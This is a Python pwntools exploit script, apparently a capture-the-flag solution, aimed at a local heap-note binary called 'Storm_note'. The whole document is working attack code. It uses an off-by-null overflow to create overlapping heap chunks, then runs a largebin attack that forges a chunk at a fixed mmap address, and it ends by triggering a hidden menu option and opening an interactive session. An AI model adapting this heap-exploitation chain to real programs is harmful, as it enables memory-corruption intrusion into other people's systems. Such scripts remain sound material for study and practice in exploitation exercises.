from pwn import *
p = process('./Storm_note')
context.update(log_level="debug",terminal=["tmux","splitw","-h"])


def z():
    gdb.attach(p)

def add(size):
  p.recvuntil('Choice')
  p.sendline('1')
  p.recvuntil('?')
  p.sendline(str(size))

def edit(idx,mes):
  p.recvuntil('Choice')
  p.sendline('2')
  p.recvuntil('?')
  p.sendline(str(idx))
  p.recvuntil('Content')
  p.send(mes)

def dele(idx):
  p.recvuntil('Choice')
  p.sendline('3')
  p.recvuntil('?')
  p.sendline(str(idx))


add(0x18)#0
add(0x508)#1
add(0x18)#2

add(0x18)#3
add(0x508)#4
add(0x18)#5
add(0x18)#6

#edit(1,'a'*0x4f0+p64(0x500))#prev_size
edit(1,'a'*0x4f0)#prev_size

edit(4,'a'*0x4f0+p64(0x500))#prev_size

dele(1)
edit(0,'a'*0x18)#off by null

z()
add(0x18)#1
add(0x4d8)#7

dele(1)

dele(2)    #overlap


#recover
add(0x30)#1
add(0x4e0)#2

dele(4)
edit(3,'a'*0x18)#off by null
add(0x18)#4
add(0x4d8)#8 0x5a0
dele(4)
dele(5)#overlap
add(0x40)#4 0x580


dele(2)    #unsortedbin-> chunk2 -> chunk5(chunk8)(0x5c0)    which size is largebin FIFO
add(0x4e8)      # put chunk8(0x5c0) to largebin
dele(2) #put chunk2 to unsortedbin


content_addr = 0xabcd0100
fake_chunk = content_addr - 0x20

payload = p64(0)*2 + p64(0) + p64(0x4f1) # size
payload += p64(0) + p64(fake_chunk)      # bk
edit(7,payload)


payload2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
payload2 += p64(0) + p64(fake_chunk+8)   
payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmap

edit(8,payload2)

add(0x40)
#gdb.attach(p,'vmmap')
payload = p64(0) * 2+p64(0) * 6
edit(2,payload)
p.sendlineafter('Choice: ','666')
p.send(p64(0)*6)
p.interactive()